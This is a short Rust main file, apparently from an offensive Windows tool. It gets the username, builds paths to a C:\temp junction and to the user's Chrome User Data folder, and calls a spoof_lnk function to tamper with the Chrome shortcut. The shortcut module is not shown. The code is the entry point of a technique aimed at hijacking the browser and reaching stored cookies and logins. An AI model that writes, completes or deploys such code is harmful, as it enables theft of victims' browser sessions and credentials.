mod shortcut;
use shortcut::{spoof_lnk, restore_lnk};

use std::path::PathBuf;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "debug")]
    println!("[*] Retreaving username...");
    let username = std::env::var("USERNAME")?;

    let _junc_path: PathBuf = PathBuf::from(format!("C:\\temp\\{}", username));

    let _chrome_data_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data", username));

    #[cfg(feature = "debug")]
    println!("[*] Spoofing Chrome shortcut...");
    let _ = spoof_lnk(&username)?;

    Ok(())
}
